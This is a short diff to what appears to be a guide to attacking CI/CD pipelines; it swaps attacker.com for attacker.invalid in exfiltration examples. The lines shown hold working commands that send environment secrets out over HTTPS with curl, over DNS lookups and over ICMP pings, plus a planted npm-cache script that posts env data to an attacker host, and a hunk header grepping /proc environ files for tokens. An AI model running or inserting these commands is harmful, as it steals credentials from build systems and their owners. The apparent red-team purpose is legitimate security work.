@@ -86,16 +86,16 @@ strings /proc/*/environ 2>/dev/null | sort -u | grep -iE 'secret|token|key|pass'
 
 ```bash
 # HTTPS POST exfiltration (most reliable)
-env | base64 | curl -sS -X POST -d @- https://attacker.com/collect
+env | base64 | curl -sS -X POST -d @- https://attacker.invalid/collect
 
 # DNS exfiltration for restricted networks
 for secret in $(env | grep -i SECRET | base64 | fold -w 60); do
-    nslookup "${secret}.exfil.attacker.com" 2>/dev/null
+    nslookup "${secret}.exfil.attacker.invalid" 2>/dev/null
 done
 
 # ICMP exfiltration when HTTP is blocked
 env | xxd -p | fold -w 32 | while read chunk; do
-    ping -c 1 -p "$chunk" attacker.com 2>/dev/null
+    ping -c 1 -p "$chunk" attacker.invalid 2>/dev/null
 done
 
 # Write to pipeline artifact for later retrieval
@@ -349,7 +349,7 @@ steps:
       mkdir -p ~/.npm/_preinstall
       cat > ~/.npm/_preinstall/exfil.sh << 'PAYLOAD'
       #!/bin/bash
-      env | base64 | curl -sS -X POST -d @- https://attacker.com/cache-exfil &
+      env | base64 | curl -sS -X POST -d @- https://attacker.invalid/cache-exfil &
       PAYLOAD
       chmod +x ~/.npm/_preinstall/exfil.sh
       # Modify a cached package's install script to trigger it
